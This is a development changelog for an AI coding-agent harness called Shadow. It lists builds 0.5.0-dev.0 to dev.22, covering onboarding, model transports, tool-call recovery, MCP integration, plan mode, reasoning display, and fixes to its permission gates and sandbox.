## [0.5.0-dev.22] - 2026-06-22
_Internal development build — not for release._

### Changed
- **Onboarding redesigned** — centered layout: a big **SHADOW** ASCII banner, a boxed **compatibility disclaimer** (draft wording), then the centered provider list. (`src/onboard/onboard.ts`.)

### Added
- **`The_Red_Pill (coming soon)`** as provider option #1 — a first-party hosted service placeholder that is **not selectable and points nowhere** (no `baseUrl`/endpoint) by design, so nothing can be misrouted to it before launch. The default selection skips it (lands on Anthropic).

## [0.5.0-dev.21] - 2026-06-22
_Internal development build — not for release._

### Added
- **Transport auto-detect at onboarding.** When a chosen model's name looks Claude/Opus-distilled (`opus`/`sonnet`/`haiku`/`claude`/`anthropic`) but the **OpenAI** transport is selected, onboarding now warns and offers to switch to the **Anthropic** transport — adjusting the base URL (drops a trailing `/v1`, since the Anthropic adapter appends `/v1/messages`) and moving the key to a bearer token. Routes distilled models to the wire format they were trained for instead of mangling them on the OpenAI adapter (`src/util/transport.ts`). It's a **name heuristic — not foolproof** (an onboarding disclaimer will cover the gap); it suggests, never forces.

## [0.5.0-dev.20] - 2026-06-22
_Internal development build — not for release._

Local-model robustness, straight from the 50-prompt probe (`eval/FINDINGS-local-models.md`).

### Added
- **Text-embedded tool-call recovery.** When a model emits a tool call as assistant *text* instead of via the native channel — `<tool_call>{…}</tool_call>`, `call:NAME{…}`, `{"tool_calls":[…]}`, `{"writables":[{"tool_calls":[…]}]}` (single- or double-quoted) — the loop now recovers it into a real call (`src/provider/textToolCalls.ts`). Fires only when the turn produced no native call, and only for registered tool names (no false positives on prose). Recovered args go through the same repair ladder; invalid ones still surface as `invalid_input` for the model to retry. This reclaims the dominant gemma-class failure mode.

### Fixed
- **Leaked control/template tokens are scrubbed** from the committed answer (`src/util/scrub.ts`): bare `</think>` (local-n2), `<channel|>` / `<tool_call|>` (gemma4-opus), and the ChatML family (`<|tool_response>`, `<|im_start|>`, …). Native Anthropic thinking is unaffected (handled upstream).

## [0.5.0-dev.19] - 2026-06-21
_Internal development build — not for release._

### Added
- **`shadow mcp <list | enable | disable>`** — manage MCP servers in `~/.shadow/config.json` from the CLI. `shadow mcp enable context-cooler [--path <dir>]` wires the [Context Cooler](https://github.com/Blackfrost-AI/context-cooler) MCP server (token-efficient "think in code" retrieval — big win for small-context local models); it resolves an existing checkout (or `--path`) and registers it so the `ctx_*` tools load on next launch. `list` shows configured servers; `disable <name>` removes one. (Context Cooler's own installer also gained a `shadow` adapter — `install.py --platform=shadow` — so either side can wire it.)

## [0.5.0-dev.17] - 2026-06-21
_Internal development build — not for release._

### Added
- **MCP HTTP transport (Streamable HTTP).** MCP servers can now be configured by `url` (+ optional `headers`) in addition to stdio `command` — `McpHttpClient` POSTs JSON-RPC and handles both `application/json` and `text/event-stream` responses, with session continuity via `Mcp-Session-Id`. Operator-configured (trusted) URLs are **not** routed through the SSRF netguard, so a localhost MCP server works. Config `mcpServers` accepts either shape (validated: needs a `command` or a `url`).

## [0.5.0-dev.16] - 2026-06-21
_Internal development build — not for release._

### Added
- **`/cost` and `/context` commands** — `/cost` shows session token usage (in/out) + USD; `/context` shows context-window usage as a % of the budget with a `/compact` nudge near the limit. On-theme for cost-conscious runs and small-context local models.

## [0.5.0-dev.15] - 2026-06-21
_Internal development build — not for release._

### Added
- **Multiline composer input** — a trailing backslash turns Enter into a newline instead of submitting (`\` + Enter), so you can compose multi-line prompts/snippets. The composer renders the newlines; the hint advertises it. Reliable across terminals (no Shift+Enter ambiguity).

## [0.5.0-dev.14] - 2026-06-21
_Internal development build — not for release._

### Added
- **`/compact` command** — manually summarize earlier turns to free up the context window (forced compaction via `Context.maybeSummarize(force)`), without waiting for the auto-trigger. Especially useful for small-context local models. No-op when there's nothing to compact; refuses while a turn is running.

## [0.5.0-dev.12] - 2026-06-21
_Internal development build — not for release._

### Added
- **Background shells** (Claude `Bash run_in_background` / `BashOutput` / `KillShell` parity). `run_shell` gains `run_in_background: true` — spawns a detached, sandboxed process and returns a shell id immediately. New tools: **`bash_output`** (drains new stdout/stderr since the last read + running/exit status; risk `read`) and **`kill_shell`** (terminates the process group; risk `exec`). Backed by a per-session `BgRegistry` with output buffering + `killAll()` for shutdown. Use for dev servers, watchers, and other long-running commands.

## [0.5.0-dev.11] - 2026-06-21
_Internal development build — not for release._

Tier-1 tools + API (from `plans/gap-analysis.md`).

### Added
- **`multi_edit` tool** — apply several string edits to one file atomically, in order (each operates on the prior result); all-or-nothing, reuses the edit repair-ladder + stale-read guard, and renders a diff. Parity with Claude's MultiEdit.
- **`skill` tool** — load a discovered skill's full `SKILL.md` on demand (progressive disclosure) instead of read_file-by-path; registered when skills exist.
- **Fast mode** (`--fast` / `SHADOW_FAST` / `fastMode`) — Anthropic premium low-latency: sends top-level `speed:"fast"` + the `fast-mode-2026-02-01` beta header; disables extended thinking (mutually exclusive).
- **Extended cache TTL** (`cacheTtl: "5m" | "1h"` / `SHADOW_CACHE_TTL`) — opt into 1-hour prompt caching for the stable system+tools prefix (`extended-cache-ttl-2025-04-11`); default stays 5m.

## [0.5.0-dev.10] - 2026-06-21
_Internal development build — not for release._

Canvas polish — chat-fidelity Phase 3–4 (the visible "feels like the reference client" upgrades).

### Added
- **Syntax highlighting in code blocks.** Fenced code in the chat canvas is now tokenized and colored (keywords, strings, numbers, comments) instead of flat green — dependency-free (`src/util/highlight.ts`): a single-pass tokenizer with a broad cross-language keyword set and per-language line-comment style (`#` for Python/shell/etc., `//` for C-family). Unknown languages still get strings/numbers/comments.
- **Diff view for edits.** `edit_file` / `write_file` now render a real +/- colored line diff in the transcript (LCS-based, with context and a size cap; `src/util/diff.ts`) instead of a one-line summary. The diff is **UI-only** — it rides on `ToolResult.meta`, so it shows in the canvas without bloating the model's context. The headless renderer keeps the clean one-liner.

## [0.5.0-dev.9] - 2026-06-21
_Internal development build — not for release._

Closes out the Tier-0 correctness/security items from `plans/gap-analysis.md`.

### Fixed
- **🔴 MCP tools no longer all auto-approve (security).** Every MCP tool was registered as `risk:'read'` (auto-approved at `auto-read`+) with an accept-anything input schema. Now: risk is derived from the server's tool annotations — `readOnlyHint` → `read`, everything else → `exec` (needs approval until `full`), since an arbitrary MCP tool's effects are unknown; and a real JSON-Schema→Zod converter (`jsonSchemaToZod`) validates the model's arguments before the call (object props/required/types, enums, arrays, unions; unknown shapes stay permissive; extras pass through).

### Changed
- **Accurate token accounting (the `count_tokens` goal, no extra network call).** Summarization triggering and the context-% HUD now use the **real** request size the API reports each turn (`input + cache_read + cache_creation` tokens — which includes the system prompt and tool definitions), falling back to the char/4 heuristic only before the first turn / after a summary. Far closer to the true context-window usage than message-only char/4.

## [0.5.0-dev.8] - 2026-06-21
_Internal development build — not for release._

Chat-fidelity Phase 1 (reasoning for all models) + the `pause_turn` Tier-0 fix.

### Added
- **Universal reasoning normalization.** Reasoning from any model now flows into the same channel Claude's native thinking uses and renders in the canvas: inline `<think>`/`<thinking>` tags (DeepSeek-R1, Qwen, many local models) are split out of the answer by a streaming-safe parser (`src/util/thinkingTags.ts`), and the OpenAI adapter maps the separate `reasoning_content`/`reasoning` SSE fields too. **Display-only for non-Claude** — these spans carry no signature, are never stored in history, and are never replayed to the API (so no 400s), while Claude's signed blocks still round-trip.

### Fixed
- **`pause_turn` now resumes the turn (Tier 0).** A server-paused long turn (`stop_reason: "pause_turn"`, more likely with extended thinking) previously mapped to `end_turn` and stopped the loop mid-answer. The partial turn is committed and the loop re-requests to continue, bounded by the iteration/token/wall-clock budget.

## [0.5.0-dev.7] - 2026-06-21
_Internal development build — not for release._

Chat canvas + Tier-0 permission/security fixes from the Shadow-vs-2.1.185 gap analysis (`plans/gap-analysis.md`).

### Added
- **Chat canvas (markdown rendering) for all models.** Assistant turns — live stream and committed history — now render through a streaming-aware markdown engine (headings, bold/italic, inline code, bullet/ordered lists, blockquotes, fenced code blocks). Harness-side, so any model (Claude, OpenAI-compat, local) reads like the reference client; plain text round-trips unchanged. New `src/util/markdown.ts` + `Markdown` component (`plans/chat-fidelity.md` Phase 2).
- **`--add-dir <path>` / `additionalDirectories` config** — grant read/write to a dir outside the workspace. Widens **both** the file-tool jail and the run_shell sandbox, so an approved write outside the workspace actually lands. Trusted-source-only (CLI/env/`~/.shadow`); a cloned project's config cannot widen the jail.

### Fixed
- **🔴 Sub-agent permission bypass (security).** The `agent` tool ran sub-loops with `AutoApproveGate`, auto-approving every tool call — including denylisted catastrophic commands — regardless of autonomy. Sub-agents now inherit the session's **live gate + current autonomy**, so they are bound by the same permission posture as the main loop (interactive asks, headless denies, yolo stays yolo).
- **Writes outside the workspace were impossible even with permission granted** — the jail/sandbox were single-root and enforced independently of the gate. Fixed by the grant mechanism above.

### Docs
- `plans/gap-analysis.md` — full Shadow vs the reference client gap matrix (tiered). `plans/chat-fidelity.md` — chat-parity-for-all-models plan. `ROADMAP.md` refreshed.

## [0.5.0-dev.6] - 2026-06-21
_Internal development build — not for release._

Refines dev.5's extended-reasoning wiring against the 2.1.185 API breakdown.

### Added
- **1M context window** — sends `anthropic-beta: context-1m-2025-08-07` for `[1m]` model variants (e.g. `claude-opus-4-8[1m]`), gated via `anthropicBetaHeaders`.
- **Visible reasoning** — adaptive thinking now requests `display: "summarized"`. The default (`"omitted"`) returns an empty `thinking` string, so dev.5's live-reasoning panel showed nothing; it now streams Claude's reasoning summary.

### Fixed
- **Same-model thinking replay.** Thinking blocks are stamped with the model that produced them and replayed only on requests to that same model; a `/model` switch (even within Anthropic, e.g. opus→sonnet) drops them, since a signature is only valid for its issuing model — previously this would 400 on the next turn.

### Notes
- Confirmed against the breakdown: `output_config.effort` is GA on 4.6+ and needs **no** beta header (dev.5 was correct); sampling params (`temperature`/`top_p`/`top_k`) and `{type:"enabled",budget_tokens}` all 400 on adaptive models.

## [0.5.0-dev.5] - 2026-06-21
_Internal development build — not for release._

### Added
- **Extended reasoning for Claude 4.6+ / Fable 5.** The Anthropic adapter now sends `thinking: {type:"adaptive"}` + `output_config: {effort}` on capable models (gated by `supportsAdaptiveThinking`), turning Claude's agentic reasoning on. Older Claude (≤4.5), local, and OpenAI-compatible models are untouched — they get no thinking config. Per current API behavior, `thinking:{type:"enabled",budget_tokens}` and `{type:"disabled"}` both 400 on these models, so depth is controlled solely via effort; interleaved thinking is automatic under adaptive mode (no beta header).
- **`effort` control** — `low | medium | high | xhigh | max` (default `high`), settable via `shadow.config.json`, `SHADOW_EFFORT`, or `--effort`. The primary intelligence/latency/cost dial.
- **Live reasoning in the TUI** — streamed thinking renders dim/italic above the answer and is cleared once the answer streams or a tool runs. The headless renderer ignores it, keeping scripted `--task` output clean.

### Changed
- **Thinking blocks now round-trip through history.** A new internal `ThinkingBlock` (text + signature) is captured from the stream and prepended to the assistant turn; `toAnthropicMessages` re-emits it first and drops unsigned blocks (e.g. after a `/model` switch to a non-Anthropic provider), so the API no longer 400s when a thinking turn carried tool_use. This supersedes the prior "thinking left off because the block model can't round-trip signatures" decision.
- With adaptive thinking on, `max_tokens` is floored to 32k on Anthropic requests (it caps thinking + answer combined, so the old 8k default could truncate mid-reasoning). Only billed for tokens actually produced; other providers unchanged.

## [0.5.0-dev.4] - 2026-06-21
_Internal development build — not for release._

### Added
- `prompts/SHADOW.md` — a fresh, **model-tier-adaptive** agent profile, now the single shipped source of truth for the system prompt. Its "Calibrate to your capability" section lets one harness elevate a small local model (lean hard on the read/verify/plan/todo scaffolding) without hobbling a frontier model like Claude (guardrails, not handcuffs).
- Layered profile loading in `resolveSystem`: bundled `prompts/SHADOW.md` (default) → `~/.shadow/SHADOW.md` (global; replaces the default) → `<workspace>/SHADOW.md` (project; appended) → `--system <path>` (explicit override).

### Changed
- The runtime default system prompt is read from `prompts/SHADOW.md` (small inline fallback if unreadable); removed the stale inline default and the unused `prompts/agent.md`. Docs repointed.

## [0.5.0-dev.3] - 2026-06-21
_Internal development build — not for release._

### Added
- Release automation: `npm run release:dev` (and `release:patch` / `release:minor`) bumps the version, commits, tags, and pushes in one step. A committed `.githooks/pre-push` guard — enabled per checkout with `npm run setup:hooks` — **blocks pushes to `main` unless the tip commit is at a release tag**, so a version bump can't be forgotten (`git push --no-verify` bypasses in a pinch).

### Changed
- The structured `shadow ready` log line is now emitted only when output is piped/redirected (logs, CI); in an interactive terminal it's suppressed since the banner already shows provider/model/autonomy.

## [0.5.0-dev.2] - 2026-06-21
_Internal development build — not for release._

### Fixed
- Welcome banner now spans the **full terminal width**, uniform with the input and overlay boxes. As a `<Static>` item `width="100%"` collapsed to content width; it now uses an explicit `width={columns}` (from `useStdout`) so the header bar is the same length as every other bar.

## [0.5.0-dev.1] - 2026-06-21
_Internal development build — not for release._

### Added
- Full-width welcome banner — build info on the left, a large ASCII **SHADOW** wordmark on the right, with a compact stacked-card fallback on narrow terminals.

### Changed
- Install is a single full `npm install` (dropped `--omit=dev`) so every machine pulls the identical developer setup; README split into separate macOS/Linux and Windows (PowerShell) blocks.

### Fixed
- `shadow update` no longer silently no-ops on a dirty mirror checkout — it fetches and hard-resets to `origin/<branch>` (handling a rebuilt `dist/` or re-resolved `package-lock.json`), while refusing to discard unpushed commits on the source box.

## [0.5.0-dev.0] - 2026-06-21
_Internal development build — not for release. Supersedes v0.4.0._

### Added
- **Plan mode**: new `enter_plan_mode` / `plan_write` / `exit_plan_mode` tools let the agent request approval to plan, write the plan to `plans/<slug>.md`, then get approval before implementing. While planning, read-risk tools (plus `plan_write` and `memory` recall/list) are allowed, but every non-read tool — `write_file`/`edit_file`/`run_shell`/`web_fetch`/`web_search` and other write/exec/network tools — is blocked until the plan is approved. Enable via `--plan-mode` flag or `planMode` config (also auto-activates with the `procedural` style).
- **Output styles**: selectable `proactive` / `explanatory` / `learning` / `procedural` styles that reshape the system prompt. Pick with the `--style <name>` flag or cycle live with the new `/style` command; the choice persists as `lastStyle`.
- `todo_write` tool — a whole-list-replace task checklist (subject/status/description) pinned into the system prompt every turn so it survives summarization, surfaced as live TUI progress and emitted as `todo` events.
- `agent` sub-agent tool — launches an isolated sub-loop with fresh context and budget (up to 15 iterations) and returns its final answer for delegated multi-step work.
- `ask_user_question` tool — pose structured multiple-choice questions (optional header, 2+ options, optional `multiSelect`) when blocked on a user-only decision; answers flow through the approval gate.
- `schedule_wakeup` tool — schedule a follow-up task to run later in the same session after `delay_seconds` (1s–86400s), backed by an in-session wakeup scheduler.
- `run_shell` gains an optional `description` parameter (active-voice command summary, Claude Bash parity) and now streams stdout/stderr live via `shell_output` events while running.
- **TUI overhaul**:
  - Plan and Todo side-panels that appear only when populated, plus compact `plan: planning` / `todo n/m` state in the input footer.
  - Type and edit input while a turn runs; Enter mid-run queues the text as an interrupt, aborts the current model turn, and runs the queued input next.
  - Interactive multiple-choice question prompt (numbered options, `1`-`9` select, Enter confirm, Esc skip).
  - Dedicated plan-mode approval dialogs (`Enter plan mode?` / `Approve plan?`).
  - Live shell output streamed into the active tool line.
  - Model-fallback events surfaced in the transcript, updating the active model.
  - Wakeup-scheduled tasks injected into the live session and run automatically as `[wakeup: reason] task`.
  - New `/export [path]` command to write the session transcript to a markdown file (with run metadata), reporting bytes and output path.
- **MCP support**: stdio MCP client registers tools from configured `mcpServers` as `mcp_<server>_<tool>` (each registered at `read` risk).
- **Hooks**: `pre_tool_use` / `post_tool_use` script hooks; a non-zero pre-hook exit denies the call, post-hooks receive the tool output.
- **Skills discovery**: `SKILL.md` files under `skills/` and `.shadow/skills/` are indexed into the system prompt for on-demand loading via `read_file`.
- **Model fallback**: automatic one-time swap to a configured fallback model on eligible provider errors (HTTP 502/503/529, overloaded, server_error, model_not_found/"not found", permission_denied), emitting a `model_fallback` event. Backed by global `fallbackModel`, per-preset `fallback`, and a `disabled` flag to exclude a model.
- `shadow export [path.md]` subcommand — render a session JSONL log to markdown (YAML frontmatter with version/model/style/autonomy/workspace/session; user/assistant/tool/blocked/fallback/error/retry/stop sections); supports `--session` and `--out`, defaults to the latest session and `exports/`.
- Plain REPL gains interactive multiple-choice (`user_question`) prompts and plan-mode approval prompts (`plan_enter` / `plan_exit`, yes/no only for entering).
- Human-readable denial messages via `friendlyDeniedReason` across transcript, export, and headless output.
- New config keys: `hooks`, `mcpServers`, `fallbackModel` (+ per-model `fallback`/`disabled`), `parallelTools` (default true), `planMode` (default false), and `style` / `lastStyle`.

### Changed
- `Shift+Tab` now cycles a mode ring that folds plan mode in after the autonomy levels (manual → auto-read → auto-edit → full → plan); leaving plan mode wraps back to manual.
- Independent tool calls in a turn now run concurrently by default; execution stays sequential in plan mode, for gate tools (`enter_plan_mode`/`exit_plan_mode`/`ask_user_question`), and when `parallelTools` is disabled.
- De-boxed chat transcript: messages render as plain scrolling text with no per-message borders or header labels; tool/denial rows fold the tool name inline (`⎿ name`).
- Replaced the plain startup banner with a one-time bordered welcome card (version, workspace, key hints, YOLO warning), re-shown after `/clear`.
- Input composer now renders inside a dimmed bordered box with a status footer and context-sensitive key hints; approval dialog, model picker, and running spinner moved into bordered overlay boxes.
- Denied tool calls now display as `blocked` (yellow) with a friendly explanation instead of `denied` (red), in both TUI and headless output.
- `/model` picker hides models flagged `disabled` in config.
- Approval/preview text prefers a tool-supplied `description` when present instead of always deriving from command/path/url.
- `glob` returns matches newest-first (descending mtime, stable on ties) for Claude parity.
- System prompt (built-in default and `prompts/agent.md`) now directs using the `todo_write` checklist for any task with 3+ steps, and is assembled per active output style (style block + workspace facts) at startup.

### Fixed
- An explicit `--provider` (or `SHADOW_PROVIDER`) is no longer silently overridden by the saved last-model selection.
- Piped/redirected stdin now reads the full input stream up front (`readFileSync(0)`), so task lines written before startup are no longer dropped.

### Security
- New `permissionRules` engine: per-call rules match by tool name (with `*` wildcard) and an optional case-insensitive regex over the call preview + JSON input, resolving to `deny` / `ask` / `allow`. Rules are evaluated before coarse autonomy gating, so `deny` blocks the call, `ask` forces confirmation even when autonomy would auto-approve, and `allow` auto-approves the call — skipping both forced confirmation and autonomy-level approval.
- `pre_tool_use` hooks can deny a tool call before it executes (non-zero exit blocks the call).

## [0.4.0] — prior release

### Added
- OS sandbox for `run_shell` — macOS seatbelt / Linux bwrap.

### Security
- Process-group kill on abort, hardened credentials-file permissions, tool-JSON ReDoS guard.
- `web_fetch` pinned to the validated IP, closing the DNS-rebind SSRF.
- Hardened config trust, command denylist, SSRF netguard, log redaction, and the memory write gate.

_Earlier releases (v0.3.x and below) live in the git history._
